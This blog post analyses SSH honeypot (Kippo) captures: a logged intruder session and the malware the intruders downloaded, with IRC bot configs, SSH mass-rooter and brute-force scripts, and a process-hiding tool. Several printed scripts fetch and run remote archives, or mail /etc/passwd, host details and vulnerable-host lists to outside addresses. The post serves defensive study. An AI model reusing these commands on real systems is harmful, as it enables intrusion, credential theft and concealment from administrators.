    server:/tmp/,# tar zxvf fast.jpg    fast    fast/src    fast/src/xmech.o    fast/src/xmech.c    fast/src/vars.o    fast/src/vars.c    fast/src/userlist.o    fast/src/userlist.c    fast/src/usage.h    fast/src/text.h    fast/src/structs.h    fast/src/socket.o    fast/src/socket.c    fast/src/parse.o    fast/src/parse.c    fast/src/mcmd.h    fast/src/Makefile.in    fast/src/Makefile    fast/src/main.o    fast/src/main.c    fast/src/link.o    fast/src/link.c    fast/src/h.h    fast/src/global.h    fast/src/gencmd.c    fast/src/gencmd    fast/src/function.o    fast/src/function.c    fast/src/defines.h    fast/src/debug.o    fast/src/debug.c    fast/src/dcc.o    fast/src/dcc.c    fast/src/config.h.in    fast/src/config.h    fast/src/commands.o    fast/src/commands.c    fast/src/combot.o    fast/src/combot.c    fast/src/com-ons.o    fast/src/com-ons.c    fast/src/channel.o    fast/src/channel.c    fast/src/cfgfile.o    fast/src/cfgfile.c    fast/r    fast/r/rversions.e    fast/r/rtsay.e    fast/r/rsignoff.e    fast/r/rsay.e    fast/r/rpickup.e    fast/r/rnicks.e    fast/r/rkicks.e    fast/r/rinsult.e    fast/r/raway.e    fast/mkindex    fast/Makefile    fast/m.set    fast/m.help    fast/LinkEvents    fast/go    fast/genuser    fast/configure    fast/checkmech    fast/bash    fast/3.user    fast/2.user    fast/1.user    fast/configure.c    server:/tmp/,# cd fast
    server:/tmp/,/fast# ls -a    .           ..          src         r           mkindex     Makefile        m.set       m.help      LinkEvents  go          genuser     configure       checkmech   bash        3.user      2.user      1.user      configure.c 
    server:/tmp/,/fast# vi 1.user    E558: Terminal entry not found in terminfo
    server:/tmp/,/fast# pico 1.user    bash: pico: command not found
    server:/tmp/,/fast# apt-get  install pico    Reading package lists... Done    Building dependency tree    Reading state information... Done    The following NEW packages will be installed:      pico     0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.    Need to get 158.2kB of archives.    After this operation, 347.6kB of additional disk space will be used.    Get:1 http://ftp.debian.org stable/main pico 1.15-7 [158.2kB]    Fetched 158.2kB in 1s (4493B/s)    Reading package fields... Done    Reading package status... Done    (Reading database ... 177887 files and directories currently installed.)    Unpacking pico (from .../archives/pico_1.15-7_i386.deb) ...    Processing triggers for man-db ...    Setting up pico (1.15-7) ...    server:/tmp/,/fast# pico 1.user    pico: Segmentation fault
    server:/tmp/,/fast# ./pico 1.user    bash: ./pico: command not found
    server:/tmp/,/fast# wget pinky.clan.su/altele/pico.jpg    --2011-03-02 21:09:32--  http://pinky.clan.su/altele/pico.jpg    Connecting to pinky.clan.su:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 84478 (82K) [image/jpeg]    Saving to: `pico.jpg
    100%[======================================>] 84,478       27K/s  eta 1s
    2011-03-02 21:09:34 (27 KB/s) - `pico.jpg' saved [84478/84478]    server:/tmp/,/fast# tar zxvf pico.jpg    pico    server:/tmp/,/fast# ./pico 1.user    Shall we play a game?     A strange game. The only winning move is not to play.  How about a nice game of chess?
    server:/tmp/,/fast# ./pico 1.user    Shall we play a game? y    A strange game. The only winning move is not to play.  How about a nice game of chess?
    server:/tmp/,/fast# 
    server:/tmp/,/fast# ls -a    .           ..          src         r           mkindex     Makefile        m.set       m.help      LinkEvents  go          genuser     configure       checkmech   bash        3.user      2.user      1.user      configure.c     pico.jpg    pico        
    server:/tmp/,/fast# apt-get install vi    Reading package lists... Done    Building dependency tree    Reading state information... Done    The following NEW packages will be installed:      vi     0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.    Need to get 442.2kB of archives.    After this operation, 972.4kB of additional disk space will be used.    Get:1 http://ftp.debian.org stable/main vi 0.12-1 [442.2kB]    Fetched 442.2kB in 1s (4493B/s)    Reading package fields... Done    Reading package status... Done    (Reading database ... 177887 files and directories currently installed.)    Unpacking vi (from .../archives/vi_0.12-1_i386.deb) ...    Processing triggers for man-db ...    Setting up vi (0.12-1) ...
    server:/tmp/,/fast# vi 1.user    E558: Terminal entry not found in terminfo
    server:/tmp/,/fast# 
    server:/tmp/,/fast# wget http://root-arhive.do.am/scanner/goshNEW.jpg  ; tar zxvf goshNEW.jpg ; cd goshNEW ; chmod +x *
    server:/tmp/,/fast# cd ..
    server:/tmp/,# ls -a    .        ..       fast.jpg fast     
    server:/tmp/,# wget http://root-arhive.do.am/scanner/goshNEW.jpg  ; tar zxvf goshNEW.jpg ; cd goshNEW ; chmod +x *    --2011-03-02 21:11:59--  http://root-arhive.do.am/scanner/goshNEW.jpg    Connecting to root-arhive.do.am:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 3144067 (2M) [image/jpeg]    Saving to: `goshNEW.jpg
    100%[======================================>] 3,144,067    759K/s  eta 0s       2011-03-02 21:12:03 (759 KB/s) - `goshNEW.jpg' saved [3144067/3144067]
    goshNEW    goshNEW/a    goshNEW/userrootmic.txt    goshNEW/gen-pass.h    goshNEW/mass    goshNEW/2    goshNEW/ss    goshNEW/pscan2    goshNEW/secure    goshNEW/ssh-scan    goshNEW/sortateusr.txt    goshNEW/CITESTE-INAINTE-SA-INCEPI    goshNEW/vuln.txt    goshNEW/common    goshNEW/1    goshNEW/gen-pass.sh    goshNEW/go.shB    goshNEW/pass_file    goshNEW/5    goshNEW/userroomare.txt    goshNEW/3    goshNEW/mfu.txt    goshNEW/4    goshNEW/screen    goshNEW/go.shA
    server:/tmp/,/goshNEW# screen    bash: screen: command not found
    server:/tmp/,/goshNEW# ./screen    Shall we play a game?     A strange game. The only winning move is not to play.  How about a nice game of chess?
    server:/tmp/,/goshNEW# 
    server:/tmp/,/goshNEW# apt-get install screen    Reading package lists... Done    Building dependency tree    Reading state information... Done    The following NEW packages will be installed:      screen     0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.    Need to get 774.2kB of archives.    After this operation, 1702.8kB of additional disk space will be used.    Get:1 http://ftp.debian.org stable/main tmpgoshNEWscreen 0.19-7 [774.2kB]    Fetched 774.2kB in 1s (4493B/s)    Reading package fields... Done    Reading package status... Done    (Reading database ... 177887 files and directories currently installed.)    Unpacking tmpgoshNEWscreen (from .../archives/tmpgoshNEWscreen_0.19-7_i386.deb) ...    Processing triggers for man-db ...    Setting up tmpgoshNEWscreen (0.19-7) ...    server:/tmp/,/goshNEW# screen
# Malware analysis
Kippo also provides another handy function: it stores any downloaded files. This allows us to further analyze some of the malware used by the intruders.
## File http___fiunic_eu_pub.tgz
An archive containing what looks like source code for an SSH server.
## File http___pinky_clan_su_mech_fast.tgz
This archive contains an IRC bot. `configure.c` shows:    #############CONF##############
    my $hidden = '/usr/sbin/apache/log';
    my $linas_max='4';
    my $sleep='5';
    my @admins=("Senil","Dereglat");
    my @hostauth=("Senil.users.quakenet.org","Dereglat.users.quakenet.org");
    my @channels=("#anyone312");
    my $nick='bombon';
    my $ircname ='furt';
    my $realname = 'pe fatza';
    my $server='multiplay.uk.quakenet.org';
    my $port='6667';    ##############################
Joining the channel on Quakenet reveals nothing.
The archive also contains an executable called `bash`. This is a compiled EnergyMech IRC bot. The source code is also included in the archive, together with configuration:
    SERVER diemen.nl.eu.undernet.org 6667    SERVER London2.UK.EU.Undernet.Org 6667    SERVER 62.231.74.10 6667    SERVER lelystad.nl.eu.undernet.org 6667    SERVER mesa.az.us.undernet.org 6667    SERVER Zagreb.Hr.EU.UnderNet.org 6667    SERVER Helsinki.FI.EU.Undernet.org 6667    SERVER Carouge.CH.EU.Undernet.org 6667    SERVER us.undernet.org 6667    SERVER oslo2.no.eu.undernet.org 6667    ENTITY x
    ###BOT 1###    NICK Red-hack1    USERFILE 1.user    CMDCHAR .    LOGIN rosu    IRCNAME  4®  12Welcome  3in  14My  4World 13!!!  7®      MODES +ix-ws    HASONOTICE    TOG CC          1    TOG CLOAK       1    TOG SPY         1    SET OPMODES     6    SET BANMODES    6    CHANNEL         #canalul-tau    TOG PUB         1    TOG MASS        1    TOG SHIT        1    TOG PROT        1    TOG ENFM        0    SET MKL         7    SET MBL         7    SET MPL         1
Also here, joining the channel does nothing.
The archive also contains a shell script, used to check if the bot is still running and to restart it:
    #! /bin/sh
    RUN=./bash    OPT=    OUTPUT=./mech.cron    if [ -r mech.pid ]; then      PID=`cat mech.pid`      if [ -r /proc/$PID ]; then        exit 0      fi      if ( kill -0 $PID 1> /dev/null 2> /dev/null ); then        exit 0      fi    fi    echo >> $OUTPUT    echo "Mech restarted:" >> $OUTPUT    ( date 2>&1 ) >> $OUTPUT    echo >> $OUTPUT    ( $RUN $OPT 2>&1 ) >> $OUTPUT95
Shell scripts like these are often put in crontabs.
## File http___arhiva_do_am_scan.tar
This archive contains the often repacked `pscan` and `ssh-scan` tools. A shell script called `start` contains:
    #/bin/bash
    # start.sh script
    # part of ssh massrooter by pulea
    # /j #r.o.o.t pt intrebari :)
    if [ $# != 1 ]; then
            echo "[+] pulea zice :"
    sleep 3
            echo "[+] sa-mi bag pula in creierii tai !"
            echo "[+] ex. : $0 <b class>"
            exit;
    fi
    clear
    cat a1
    if [ -f a4 ]; then
    echo "[+] Checking files.."
    sleep 3
    echo " OK"
    perl sshc.c
    ./a $1.0
    ./a $1.1
    ./a $1.2    ./a $1.3    ./a $1.4    ./a $1.5    ./a $1.6    ./a $1.7    ./a $1.8    ./a $1.9    ./a $1.10    ./a $1.11    ./a $1.12    ./a $1.13    ./a $1.14    ./a $1.15    ./a $1.16    ./a $1.17    ./a $1.18    ./a $1.19    ./a $1.20
    cat vuln.txt |mail -s "vuln.txt" luchian8@gmail.com
    #SNIP
    rm -rf sshc.c
    killall -9 a 
    killall -9 a
    killall -9 pscan2    if [ "$(whoami)" != "root" ]; then    ./sshf    else    ./sshf0    fi    clear    echo "[+] momentul adevarului :)"    echo "[+] ne odihnim cateva secunde .."    sleep 5    echo ""    cat vuln.txt    cat vuln.txt >> .vulnold.txt    echo > vuln.txt    cat a6 >> vuln.txt    else    echo "[+] Checking files.."    sleep 3    echo " error"    echo "[+] Some file are missing"    echo "[+] Please reinistall it from your wget"    echo "[+] or ask pulea !"
I wonder who this luchian8@gmail.com is... Anyway, `a` is another shell script running:
    #!/bin/bash
    ./pscan2 $1 22     sleep 5    cat $1.pscan.22 |sort |uniq > mfu.txt    oopsnr2=`grep -c . mfu.txt`    echo ""    echo "[+] Attacking $oopsnr2 servers!"    echo ""    perl sshc.c    rm -rf sshc.c    ./pass_sh    ./ssh-scan 100    rm -rf $1.pscan.22 mfu.txt    echo ""
`pscan` is a basic port scanner for an IP block. `ssh-scan` is a password brute forcer. Other files just contain some dubious ascii art:
     __^__                                                              __^__    ( ___ )------------------------------------------------------------( ___ )     | / |               #help-bnc present`s:                           | \ |     | / |       OmAr'z ssh massrooter build on 11-01-2006              | \ |     | / |                                                              | \ |     | / |                  Thanks to :  OmAr                           | \ |     | / |                 and to all #OmAr members.                    | \ |     | / |                                                              | \ |     | / |    Fucks goes to : all hackers, we are script kiddies..      | \ |     | / |                    so what ? fuck off !                      | \ |     | / |                                                              | \ |     | / |                      EOF by OmAr                             | \ |     | / |--------------------------------------------------------------| \ |     |___|______________[OmAr'z ssh massrooter by OmAr]_________________|___|    (_____)------------------------------------------------------------(_____)       ^                                                                  ^
## File http___gblteam_webs_com_gosh.tgz.tar
Another repackaging of the `pscan`-`ssh-scan` combination. This one contains a script called `secure`:
    #!/bin/bash    if [ `whoami` == "root" ]; then    chmod -x /usr/bin/mail    mv /usr/bin/mail /usr/bin/s8    echo " Done , You can scan now "    else    echo -e " you're not root you're `whoami` with id `id` !! "    fi
... because disabling `mail` totally hides your tracks, yo.
The script `scam` contains a variation of the script seen above:
    #!/bin/bash    echo "[+] [+] [+] RK [+] [+] [+]" >> info2    echo "[+] [+] [+] IP [+] [+] [+]" >> info2    /sbin/ifconfig -a >> info2    echo "[+] [+] [+] uptime [+] [+] [+]" >> info2    uptime >> info2    echo "[+] [+] [+] uname -a [+] [+] [+]" >> info2    uname -a >> info2    echo "[+] [+] [+] /etc/issue [+] [+] [+]" >> info2    cat /etc/issue >> info2    echo "[+] [+] [+] passwd [+] [+] [+]" >> info2    cat /etc/passwd >> info2    echo "[+] [+] [+] id [+] [+] [+]" >> info2    id >> info2    echo "[+] [+] [+] Spatiu Hdd / pwd [+] [+] [+]" >> info2    df -h >> info2    pwd >> info2    cat info2 | mail -s "Scanner MaLa Port : ?? | Pass : stii tu :))" mafia89tm@yahoo.com    rm -rf info2    clear
    echo "####################################################################"     echo "#                          ______                                  "    echo "#                        .-.      .-.                               "    echo "#                       /            \                              "    echo "#                      |     zRR      |                             "     echo "#                      |,  .-.  .-.  ,|                             "      echo "#                      | )(z_/  \z_)( |                             "     echo "#                      |/     /\     \|                             "     echo "#              _       (_     ^^     _)                             "     echo "#      _\ ____) \_______\__|IIIIII|__/_________________________     "     echo "#     (_)[___]{}<________|-\IIIIII/-|__zRR__zRR__zRR___________\    "     echo "#       /     )_/        \          /                               "     echo "#                         \ ______ /                              "    echo "#                         SCANER PRIVAT                             "     echo "#             SCANER FOLOSIT DOAR DE TEAMUL MaLaSorTe               "    echo "#            SACNERUL CONTINE UN PASS_FLIE DE 3MEGA !!              "     echo "####################################################################"
    if [ -f a ]; then    cat vuln.txt |mail -s "Lame Gang Us Roots" mafia89tm@yahoo.com    ./a $1.0    ./a $1.1    ./a $1.2    ./a $1.3    ./a $1.4    ./a $1.5    ./a $1.6    ./a $1.7    ./a $1.8    ./a $1.9    ./a $1.10    cat vuln.txt |mail -s "Lame Gang Us Roots" mafia89tm@yahoo.com
    # SNIP    killall -9 a    else     echo # Ciudat ..Nu Ai Urmat Instructiunile  #    echo # trebui dat mv assh a sau mv scan a   #    echo # orice ai avea tu ... dohh ..         #    killall -9 a    killall -9 pscan2    fi
... because writing a for-loop is too hard. I wonder who mafia89tm@yahoo.com is. Also, if you disable `mail`, how does `mail` work, exactly?
## File: http___no_biju_com_merge_Arhive_devilflood.tar.gz
A package containing executables, probably used to DoS servers. TCP, UDP, IRC and SMTP flooders are present. There is a list of IP addresses in a txt file, probably targets.
There are also a few configuration files with Undernet IRC channels, but joining them reveals no users.
## File http___www_freewebs_com_iulianshooter_psyBNC2_3_2_4.tgz.tar.gz
This is [PsyBNC](http://www.psybnc.at/about.html):
> psyBNC is an easy-to-use, multi-user, permanent IRC-Bouncer with many features. Some of its features include symmetric ciphering of talk and connections (Blowfish and IDEA), the possibility of linking multiple bouncers to an internal network including a shared partyline, vhost- and relay support to connected bouncers and an extensive online help system. Many other helpful functions are included. It compiles on Linux, FreeBSD, SunOs and Solaris.
## File http___eu_ro_ca_img.tar
Another package containing `pscan`. There's also an IRC bot present:
    echo "SERVER 82.196.213.250 6666" >> m.set    echo "SERVER 208.83.20.130 6667" >> m.set    echo "SERVER 195.197.175.21 6669" >> m.set
    echo "ENTITY $2" >> m.set
    echo "### BOT 1 ###" >> m.set    echo "NICK ${denomination[$((RANDOM%num_denominations))]}" >> m.set    echo "USERFILE $2.user" >> m.set    echo "CMDCHAR ." >> m.set    echo "LOGIN ${denomination[$((RANDOM%num_denominations))]}" >> m.set    echo "IRCNAME ${denomination[$((RANDOM%num_denominations))]}" >> m.set    echo "MODES +iwsx" >> m.set    echo "HASONOTICE" >> m.set    echo "VIRTUAL $2" >> m.set    echo "TOG CC          1" >> m.set    echo "TOG CLOAK       1" >> m.set    echo "TOG SPY         1" >> m.set    echo "SET OPMODES     6" >> m.set    echo "SET BANMODES    6" >> m.set    echo "CHANNEL         #$1 " >> m.set    echo "TOG PUB         1" >> m.set    echo "TOG MASS        1" >> m.set    echo "TOG SHIT        1" >> m.set    echo "TOG PROT        1" >> m.set    echo "TOG ENFM        0" >> m.set    echo "SET MKL         7" >> m.set    echo "SET MBL         7" >> m.set    echo "SET MPL         1" >> m.set
Looking at the intercepted logs (see above) reveals the used channels. Joining this channel leads you to an active community of rooters selling shells on hacked servers.
## File http___freewebtown_com_pacalici_lib.tgz
Again an IRC bot, together with a shell script checking if the bot is running called `y2kupdate` (nice try). There's also source code for a hider program:
    /*
    psf -- Process Stack Faker (a.k.a. Fucker)
    Coded by Stas; (C)opyLeft by SysD Destructive Labs, 1997-2003
    Tested on: FreeBSD 4.3, Linux 2.4, NetBSD 1.5, Solaris 2.7
    Compile with:
    # gcc -O2 -o h h.c    # strip h
    Did you ever need to *hide* what are you doing on somewhat like public
    server? Like Quake server or maybe John The Ripper? 'Cos when your admin
    run "ps auwx" or "top" and sees process like that, it's probable you'll
    loose your shell on that server. So, what to do? Rootkit is a good solution
    but you need root privilegies to install it and it's a bit overkill for
    running an inoffensive eggdrop bot (belive me, I saw user installing rootkit
    just to hide eggdrop!). Well, this little proggie does a job for you. It
    *will not* erase some entry you wish to hide from process stack. It just
    changes a commandline for "ps" entry ;)
    This principle is widely used in many security-related programs. Nmap was
    the first I saw. How does this technique works? Take a look at execv(3)
    system call:
    int execv( const char *path, char *const argv[]);
    'path' is a path to executable file. And 'argv' array is... Well, it's
    just the same 'argv' from:       int main(int argc, char *argv[])
    where 'argv[0]' is a commandline and 'argv[1]' and higher are paramenters.    Normally 'argv[0]' receives the same value as 'path' from execv(3). But you    also can use other values! For example, when you run Nmap, it can execv(3)    itself with commandline changed to 'pine'. OK, commandline is gone. But what    to do with paramenters? Nmap uses environment to send paramenters user passed    to 'spoofed' process and ignores other paramenters. If you wish to spoof    'nmap -sS -vv -O -P0 -o lhost.log localhost' as 'pine -i', Nmap "remembers"    it's specific switches and re-execs itself as 'pine' with parameter '-i'.    Fine! But John The Ripper, Quake server & eggdrop can't fake parameters in    this way!!! What's the other way? Sorry, it's *very* dumb and *very* ugly...    What happens if you change commandline to something like:    'pine -i                                            '
    (Ya, 'pine -i' plus many space characters 0x20)? Hahah, "ps", "top" & many    other monitors just shift away *real* parameters! So, you don't hide them,    just shift away from screen. Such a "algorithm" doesn't needs neither rootkits,    neither special privilegies! Any user can do that at any time!!! *That's* "psf"    does. Try this:
    # psf -s "pine -i" sleep 30 &    [1] 440
    # ps auwx    ...    stas        84  0.0  0.6  2012 1232 pts/0    S    19:12   0:00 bash -rcfile .bashrc    stas       440  0.0  0.1  1204  376 tty2     S    20:09   0:00 pine -i
    stas       450  0.0  0.4  2544  816 tty2     R    20:12   0:00 ps auwx
    ...
    Hahahaah, that's what we need! Please note that commandline change isn't    immediate, just wait a little before it completes. But... Did you noticed    a white line between processes 440 & 450? Uhm, that's our "shift buffer".    Pray for your admin don't notice that! Anyway, they are many more problems    with parameter shifting. "top" program, for example, shows "command names"    instead of "command lines" by default. You see a file name instead of    'argv[0]' value. "psf" tries to fix that creating symlink with name of    faked commandline to real program (on previous example, it creates symlink    /tmp/.psf-xxxx/pine => /usr/bin/sleep). Note that it doesn't works on *BSD    systems (*BSD kernel (?) follows symlink and shows real filename anyway).    The ways to discover faked processes I know are:    
     * kidding with top(1)     * ps auwx --cols 1024     * cat /proc/[pidn]/cmdline (Linux only)     * whatever non-standart process stack monitors     * looking open files with "lsof" program     * if you use -d (daemonize) option, be careful!!! As any cool daemon should       do, "psf" closes std(in,out,err). What your admin will think if he (she)       sees "pine -i" with no parent and neither allocated TTY?! 
    Too many, don't you think? So, what's *THE BEST* way to hide processes?    Rootkit sounds well, but it's a bit complex to use, you know... So, IMHO,    you must get source of program you wish to hide and hardcode all parameters    inside executable... After that, rename it in whatever and let it go!    Of course you must program at least C/C++ to do such a trick. Now, if    you're glad with my quick & dirty solution called "psf", happy faking!!!
    */
Deviously simple. Adding spaces. There's also a configuration file present leading to a lonely IRC server:
    NICK          Sex    USERFILE      1    CMDCHAR       !    LOGIN          tun    IRCNAME       Nelu     MODES         +ix-ws    TOG CC        0    TOG CLOAK     1    TOG SPY       1    SET OPMODES   4    SET BANMODES  6    SET AAWAY     1    TOG NOIDLE    1        CHANNEL       #brasov    TOG PUB       1    TOG MASS      1    TOG SHIT      1    TOG PROT      1    TOG ENFM      1    SET ENFM      +nt    SET MDL       4    SET MKL       4    SET MBL       4    SET MPL       1           SERVER 200.41.53.1 6667    SERVER chmod.myftp.biz 6667
Joining the channel also reveals a small hacker community using EnergyMechs on hacked servers to DoS Russion web hosts.
## File http___ema_ucoz_com_ICE_UNIX.tgz
Again a IRC bot leading to an obscure channel on Undernet. I have not repeated the config here.
## Archive containing .sshd
A more unique malware script this time. Containing the `shv5-rootkit` rootkit, which is, according to the file, "very private", but dates back to 2007, so it's probably an old version. The tools first checks for Tripwire, Snort, and other tools. It then continues to install itself into various directories. And starts to install backdoors into various programs (`ls`, `top`, ...). It then checks for some basic vulnerable daemons, and warns that you should patch them (oh the irony). It finally also checks for other rootkits (tk7, tk8, beX2, tuxkit, optickit) and tries to remove those. It then tries to cover its tracks by clearing log files. 
The other files also mostly contained bots pointing to Undernet IRC channels. Some or quite active and contain around 100 bots, others are empty. Joining some of them gets you an immediate ban.
# Country statistics
I grepped through hundreds of lines of logging from Kippo, removed duplicate IP addresses, and used GeoIP to do a country lookup. Here are the sorted results:
    CN, China                51    US, United States        42    RO, Romania              26    CA, Canada               12    IN, India                11    KR, Korea, Republic of   10    RU, Russian Federation   10    BR, Brazil                8    DE, Germany               8    GB, United Kingdom        8    TH, Thailand              8    IT, Italy                 7    HK, Hong Kong             6    JP, Japan                 5    TR, Turkey                5    AT, Austria               4    TW, Taiwan                4    BE, Belgium               3    CO, Colombia              3    ES, Spain                 3    FR, France                3    NL, Netherlands           3    SE, Sweden                3    CZ, Czech Republic        2    EG, Egypt                 2    ID, Indonesia             2    MD, Moldova, Republic of  2    NO, Norway                2    PL, Poland                2    VN, Vietnam               2    AE, United Arab Emirates  1    AR, Argentina             1    BG, Bulgaria              1    BH, Bahrain               1    CH, Switzerland           1    CL, Chile                 1    CR, Costa Rica            1    GE, Georgia               1    GT, Guatemala             1    HU, Hungary               1    IS, Iceland               1    KE, Kenya                 1    KZ, Kazakhstan            1    LB, Lebanon               1    LT, Lithuania             1    MN, Mongolia              1    MX, Mexico                1    MZ, Mozambique            1    PA, Panama                1    PE, Peru                  1    PH, Philippines           1    SG, Singapore             1    VE, Venezuela             1  
![](http://1.bp.blogspot.com/-1yjxTiktK-w/TXgYDentuKI/AAAAAAAARR8/Yo1bNNkVWZY/s400/hacker-country-pie.png)
Be wary when interpreting these results, as they might represent "countries containing hacked servers" more than "originating countries of hackers", as hacked servers are, as we've seen, often used to get to other targets.
# Concluding remarks
Kippo has now been removed from my server, due to the fact that I don't have enough time to keep checking up on it and I feel a bit uneasy running a honeypot on server containing important data. As I've said before, modifying and extending Kippo and analysing the results using a few VPS hosts might be a fun summer project.
The main lesson to take away from this post is this: keep your servers secure. This means running upgrades, but especially choosing strong passwords (or using RSA keys). As we've seen, most malware contained brute forcing tools, trying one server after another.
While analyzing cute honeypot logs is by no means doing what one would call "advanced security research", I did have a lot of fun with it, especially when trying to investigate IRC channels and trailing the hackers.
Some time ago (actually: years and years ago), I myself was (indirectly) involved with a botnet, containing not hundred but thousands of bots, which is a story for another time. I understand the thrill of gaining your first rooted shell, but being on the opposite side of things (that is: running a server instead of hacking one) also shows how script kiddies operate without any regard for privacy, property or data. It is a valuable, but sad lesson.
